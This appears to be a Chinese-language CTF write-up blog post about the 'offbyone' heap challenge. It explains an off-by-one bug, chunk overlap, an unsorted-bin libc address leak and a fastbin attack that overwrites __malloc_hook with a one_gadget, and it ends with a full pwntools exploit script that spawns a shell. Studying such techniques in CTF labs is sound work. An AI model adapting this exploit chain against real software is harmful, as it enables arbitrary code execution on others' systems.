---
title: CTF | offbyone writeup
date: 2018-09-27 22:02:10
tags:
---
`offbyone`  `fastbin attack` `chunk overlap` 
<!-- more -->

题目就叫 `offbyone`，是 `xman` 小姐姐给的，不清楚出处...

`offbyone` 漏洞的大致思路：
1. 改写下一个块的`size`
2. 改写下一个块的`pre inuse`位
`chunk overlap `：
1. Overwrite next chunk’s size => extend free chunk
2. Overwrite next chunk’s size => extend allocated chunk
3. Overwrite next chunk’s size => shrink free chunk

这道题的 `offbyone` 比较宽松，可以写任意字节，而不仅仅是 `null`
### 程序分析
`edit` 函数有 `offbyone`：
```c
  if ( v1 >= 0 && v1 <= 15 && ptrs[v1] )
  {
    puts("your note:");
    v2 = strlen(ptrs[v1]);
    read(0, (void *)ptrs[v1], v2);
    puts("done.");
  }
```


### 利用思路
通过 `offbyone` 实现` chunk overlap`,利用 `unsorted bin `切分操作 `leak address`, 再利用 `fastbin attack` 构造 `fake chunk` 修改 `malloc_hook`, 最后 `getshell`
有几个关键的点：
1. `fastbin attack` 任意地址写
2. 改写 `size` 域，扩大后面一个，造成 `chunk overlapping` 堆块重叠，利用其中一个堆块对另一个堆块读写
3. `one_gadget`不好用->`malloc_printf` (可以通过 `double free` 触发，这样里面调用 `malloc` 函数) 
4. 利用 `unsorted bin `切分操作，让 `chunk` 写入 `fd,bk` 指针,然后泄露地址
5. 对 `size` 进行检查，只检查低 `32` 位。
6. `malloc chunk `时需要时`0x.8`的格式，这样才会覆盖到 `pre_size`,比如 `0x18`，进行对齐的时候直接对齐到 `0x20`，可以使用下一个 `chunk` 的前八个字节。在通过 `offbyone`,就可以改到 `pre_inuse` 位。但是如果是 `0x20`，就会对齐到 `0x30`,`offbyone` 盖不到。

### 利用过程
#### leak address
首先 `malloc` 5 个 `chunk`
```c
add(0x28,'a'*0x28)#0 
add(0xf8,'a'*0xf8)#1
add(0x68,'a'*0x68)#2
add(0x60,'a'*0x60)#3
add(0x60,'a'*0x60)#4
```
```python
gef➤  heap chunks
Chunk(addr=0x558de32e6010, size=0x30, flags=PREV_INUSE)
    [0x0000558de32e6010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
Chunk(addr=0x558de32e6040, size=0x100, flags=PREV_INUSE)
    [0x0000558de32e6040     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
Chunk(addr=0x558de32e6140, size=0x70, flags=PREV_INUSE)
    [0x0000558de32e6140     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
Chunk(addr=0x558de32e61b0, size=0x70, flags=PREV_INUSE)
    [0x0000558de32e61b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
Chunk(addr=0x558de32e6220, size=0x70, flags=PREV_INUSE)
    [0x0000558de32e6220     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
Chunk(addr=0x558de32e6290, size=0x20d80, flags=PREV_INUSE)  ←  top chunk
```
接下来 `delete chunk 1`,放入` unsorted bin`
```c
[+] unsorted_bins[0]: fw=0x558de32e6030, bk=0x558de32e6030
 →   Chunk(addr=0x558de32e6040, size=0x100, flags=PREV_INUSE)
```
`edit chunk 0`,利用 `offbyone`,修改 `chunk 1` 的 `size` 位的低字节为 `0x71`
修改前：
```c
gef➤  x/16gx 0x558de32e6010-0x10
0x558de32e6000:	0x0000000000000000	0x0000000000000031
0x558de32e6010:	0x6161616161616161	0x6161616161616161
0x558de32e6020:	0x6161616161616161	0x6161616161616161
0x558de32e6030:	0x6161616161616161	0x0000000000000101 => chunk 0 header
0x558de32e6040:	0x00007f4355a8fb78	0x00007f4355a8fb78
0x558de32e6050:	0x6161616161616161	0x6161616161616161
0x558de32e6060:	0x6161616161616161	0x6161616161616161
```
修改后,可以看到成功修改为 `0x171` 了，也就是将 `chunk 2` 包括进来。
```c
gef➤  x/16gx 0x558de32e6010-0x10
0x558de32e6000:	0x0000000000000000	0x0000000000000031 => chunk 0 header 
0x558de32e6010:	0x6161616161616161	0x6161616161616161
0x558de32e6020:	0x6161616161616161	0x6161616161616161
0x558de32e6030:	0x6161616161616161	0x0000000000000171 => chunk 1 header
0x558de32e6040:	0x00007f4355a8fb78	0x00007f4355a8fb78
0x558de32e6050:	0x6161616161616161	0x6161616161616161
0x558de32e6060:	0x6161616161616161	0x6161616161616161
```
通过 `edit chunk 2`，修改 `chunk 3` 的 `header`,伪造 `pre_size` 和 `pre_inuse` 。这样就实现了` chunk overlap`
修改前
```c
gef➤  x/32gx 0x558de32e6130
0x558de32e6130:	0x0000000000000100	0x0000000000000070 => chunk 2 header 
0x558de32e6140:	0x6161616161616161	0x6161616161616161
0x558de32e6150:	0x6161616161616161	0x6161616161616161
0x558de32e6160:	0x6161616161616161	0x6161616161616161
0x558de32e6170:	0x6161616161616161	0x6161616161616161
0x558de32e6180:	0x6161616161616161	0x6161616161616161
0x558de32e6190:	0x6161616161616161	0x6161616161616161
0x558de32e61a0:	0x6161616161616161	0x0000000000000071 => chunk 3 header
0x558de32e61b0:	0x6161616161616161	0x6161616161616161
0x558de32e61c0:	0x6161616161616161	0x6161616161616161
```
修改后
```c
gef➤  x/16gx 0x564dfc7d01b0-0x10
0x564dfc7d01a0:	0x0000000000000170	0x0000000000000070 => chunk 3 header
0x564dfc7d01b0:	0x6161616161616161	0x6161616161616161
0x564dfc7d01c0:	0x6161616161616161	0x6161616161616161
0x564dfc7d01d0:	0x6161616161616161	0x6161616161616161
```
添加一个新的堆块，就会将 `chunk 1` 分配出去，因为我们伪造了 `chunk 1` 的 `size`,此时是 `0x170`，所以此时会进行切分操作。让 `chunk 2` 写入 `fd,bk` 指针，通过 `show(2)` 就可以泄露地址  
添加前：

```c
gef➤  x/32gx 0x564dfc7d0010-0x10
0x564dfc7d0000:	0x0000000000000000	0x0000000000000031 => chunk 0
0x564dfc7d0010:	0x6161616161616161	0x6161616161616161
0x564dfc7d0020:	0x6161616161616161	0x6161616161616161
0x564dfc7d0030:	0x6161616161616161	0x0000000000000171 => chunk 1 
0x564dfc7d0040:	0x00007f07be783b78	0x00007f07be783b78
....
0x564dfc7d0130:	0x0000000000000100	0x0000000000000070 => chunk 2
0x564dfc7d0140:	0x6161616161616161	0x6161616161616161
0x564dfc7d0150:	0x6161616161616161	0x6161616161616161
0x564dfc7d0190:	0x6161616161616161	0x6161616161616161
0x564dfc7d01a0:	0x0000000000000170	0x0000000000000070 => chunk 3 header
0x564dfc7d01b0:	0x6161616161616161	0x6161616161616161
0x564dfc7d01f0:	0x6161616161616161	0x6161616161616161
```
添加后：

`unsorted bin `剩下一个 `chunk`,大小为 `0x70`，其实也就是 `chunk 2`
```c
[+] unsorted_bins[0]: fw=0x564dfc7d0130, bk=0x564dfc7d0130
 →   Chunk(addr=0x564dfc7d0140, size=0x70, flags=PREV_INUSE)
```
我们来看一下 `chunk 2` 内容,确实写入了 `fd,bk` 输出就可以的到地址了
```c
0x564dfc7d0130:	0x6161616161616161	0x0000000000000071
0x564dfc7d0140:	0x00007f07be783b78	0x00007f07be783b78
0x564dfc7d0150:	0x6161616161616161	0x6161616161616161
0x564dfc7d0160:	0x6161616161616161	0x6161616161616161
0x564dfc7d0170:	0x6161616161616161	0x6161616161616161
```

#### fastbin attack
接下来 `malloc` 一个 `0x60` 的 `chunk`，就会将 `unsorted bin` 中 `0x70` 的 `chunk` 分配出去，也就是` chunk 2`。所以 `chunk 2` 和 `chunk 5` 是指向同一个地方的。  
再来 `delete 3` ;`delete 2`
就会把这两块都放入 `fastbin`
```c
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x564dfc7d0140, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x564dfc7d01b0, size=0x70, flags=PREV_INUSE) 
```
再通过` edit chunk 5`,修改 `chunk 2` 的 `fd` 指向` malloc_hook` 附近。修改前 `fd` 是指向 `chunk 3`。
修改前：
```c
gef➤  x/16gx 0x564dfc7d0140-0x10
0x564dfc7d0130:	0x6161616161616161	0x0000000000000071 => chunk 2 header 
0x564dfc7d0140:	0x0000564dfc7d01a0	0x6161616161616161 => fd-> chunk 3
0x564dfc7d0150:	0x6161616161616161	0x6161616161616161
gef➤  x/16gx 0x0000564dfc7d01a0
0x564dfc7d01a0:	0x0000000000000070	0x0000000000000071 => chunk 3 header 
0x564dfc7d01b0:	0x0000000000000000	0x6161616161616161 => fd -> null
```
修改后：
```c
gef➤  x/16gx 0x564dfc7d0140-0x10
0x564dfc7d0130:	0x6161616161616161	0x0000000000000071 => chunk 2 headr 
0x564dfc7d0140:	0x00007f07be783afd	0x6161616161616161 => malloc hook 附近
0x564dfc7d0150:	0x6161616161616161	0x6161616161616161
```
接下来我们 `malloc` 一个 `0x60 chunk`,首先会将 `chunk 2` 分配出去。再 `malloc` 一次，就分配到了` malloc_hook` 附近的 `fake chunk`
我们通过 `edit` 往 `fake chunk `中写数据，也就是修改 `malloc_hook` 为 `one_gadget`
```c
gef➤  x/16gx 0x00007f07be783afd
0x7f07be783afd:	0x07be444e20000000	0x07be444a0000007f => fake chunk header 
0x7f07be783b0d <__realloc_hook+5>:	0x07be4af2a4616161	0x000000000a00007f => data
0x7f07be783b1d:	0x0000000000000000	0x0000000000000000
0x7f07be783b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
gef➤  x/16gx 0x00007f07be783afd+0x10+3
0x7f07be783b10 <__malloc_hook>:	0x00007f07be4af2a4	0x000000000000000a
0x7f07be783b20 <main_arena>:	0x0000000000000000	0x0000000000000000
```
我们在 `delete 2`,`delete 5` 。因为它们指向同一个 `chunk`，所以会触发 `malloc_printerr`，里面会调用 `malloc_hook`，执行 `one_gadget`，就成功 `getshell` 了！
最终payload:

```python
from pwn import *

def add(size,note):
	p.sendlineafter(">> ","1")
	p.sendlineafter("length: ",str(size))
	p.sendafter("note:",note)

def edit(index,note):
	p.sendlineafter(">> ","2")
	p.sendlineafter("index: ",str(index))
	p.sendafter("note:",note)

def delete(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("index: ",str(index))

def show(index):
	p.sendlineafter(">> ","4")
	p.sendlineafter("index: ",str(index))

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=process('./offbyone')

add(0x28,'a'*0x28)#0
add(0xf8,'a'*0xf8)#1
add(0x68,'a'*0x68)#2
add(0x60,'a'*0x60)#3
add(0x60,'a'*0x60)#4

delete(1)
edit(0,'a'*0x28+'\x71')
edit(2,'a'*0x60+p64(0x170)+'\x70')

add(0xf8,'a'*0xf8)

show(2)
main_arena=u64(p.recvline(keepends=False).ljust(8,'\0'))-0x58
print hex(main_arena)

libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
print hex(libc_base)

system=libc_base+libc.symbols['system']
print "system",hex(system)


malloc_hook=libc_base+libc.symbols['__malloc_hook']


one_gadget=libc_base+0xf02a4

add(0x60,'a'*0x60)#5 == 2

delete(3)
delete(2)
edit(5,p64(malloc_hook-0x10-3)[0:6])

add(0x60,'/bin/sh\x00'+'a'*0x58)#2
add(0x60,'a'*3+p64(one_gadget)+'\n')
delete(2)
delete(5)

p.interactive()
```

我真的好菜...一个知识点要看好多好多遍...还忘得快，可以睡觉了，要开始看书了。
